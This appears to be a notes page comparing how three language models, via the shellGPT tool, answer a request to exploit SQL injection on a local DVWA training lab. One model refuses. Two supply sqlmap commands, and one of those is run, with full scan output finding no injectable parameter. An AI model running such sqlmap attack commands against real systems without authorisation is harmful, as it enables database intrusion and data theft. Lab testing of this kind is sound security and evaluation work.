
https://github.com/TheR1D/shell_gpt?tab=readme-ov-file

## Offline ollama/llama2 via shellGPT
```bash
sgpt --shell "exploit sql injection with this url http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
```
Result:
````bash
I can't satisfy your request, I'm just an AI and cannot assist with illegal activities such as exploiting SQL injection vulnerabilities without proper authorization and permission. It is important to respect the security and privacy of websites and systems, and any attempt to exploit vulnerabilities without proper authorization can lead to legal consequences.                            
                                                                                                                                  
Instead, I suggest you focus on learning about ethical hacking and penetration testing, which involve identifying and reporting vulnerabilities with the owner's consent. Many organizations offer bug bounty programs where you can earn money by discovering and reporting vulnerabilities in a responsible manner.                                                                                 
                                                                                                                                  
Additionally, it is important to note that SQL injection attacks are a serious security threat and can lead to sensitive data breaches. It is crucial to follow best practices for securing web applications and databases, such as using prepared statements, validating user input, and implementing proper access controls.                                                                        
                                                                                                                                  
In summary, I cannot provide you with commands for exploiting SQL injection vulnerabilities without proper authorization and permission. Instead, I recommend focusing on ethical hacking and penetration testing practices that prioritize security and privacy.
````

## Offline ollama/mistral:7b-instruct via shellGPT
```bash
sgpt --shell "exploit sql injection with this url http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
```
Result:
````bash
To exploit SQL injection on the provided URL, you can use SQLmap tool which is commonly used for database security testing and penetration testing. First, ensure SQLmap is installed:                                                                             
                                                                                                                                  
```bash                                                                                                                           
sudo apt-get install sqlmap                                                                                                       
```                                                                                                                               
                                                                                                                                  
Then, run SQLmap to perform SQL injection on the given URL:                                                                       
                                                                                                                                  
```bash                                                                                                                           
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --data="id=1"                                          
```                                                                                                                               
[E]xecute, [D]escribe, [A]bort: e
zsh:1: command not found: To

````


## Online OpenAI gpt-4 paid version via shellGPT

```bash
sgpt --shell "exploit sql injection with this url http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
```

Result:
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs --batch
[E]xecute, [D]escribe, [A]bort: e
        ___
       __H__                                                                                                                      
 ___ ___["]_____ ___ ___  {1.9.8#stable}                                                                                          
|_ -| . [)]     | .'| . |                                                                                                         
|___|_  [']_|_|_|__,|  _|                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:48:08 /2025-10-23/

[23:48:09] [INFO] testing connection to the target URL
got a 302 redirect to 'http://localhost/DVWA/login.php'. Do you want to follow? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('security=impossible;PHPSESSID=dfd1286dc07...ad0c8c7b1f'). Do you want to use those [Y/n] Y
[23:48:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:48:09] [INFO] testing if the target URL content is stable
[23:48:09] [WARNING] GET parameter 'id' does not appear to be dynamic
[23:48:09] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[23:48:09] [INFO] testing for SQL injection on GET parameter 'id'
[23:48:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:48:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:48:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:48:09] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:48:09] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:48:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:48:10] [INFO] testing 'Generic inline queries'
[23:48:10] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:48:10] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:48:10] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:48:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:48:10] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[23:48:10] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[23:48:10] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[23:48:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[23:48:10] [WARNING] GET parameter 'id' does not seem to be injectable
[23:48:10] [WARNING] GET parameter 'Submit' does not appear to be dynamic
[23:48:10] [WARNING] heuristic (basic) test shows that GET parameter 'Submit' might not be injectable
[23:48:10] [INFO] testing for SQL injection on GET parameter 'Submit'
[23:48:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:48:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:48:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:48:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:48:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:48:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:48:10] [INFO] testing 'Generic inline queries'
[23:48:10] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:48:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:48:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:48:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:48:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[23:48:11] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[23:48:11] [INFO] testing 'Oracle AND time-based blind'
[23:48:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[23:48:11] [WARNING] GET parameter 'Submit' does not seem to be injectable
[23:48:11] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 23:48:11 /2025-10-23/
```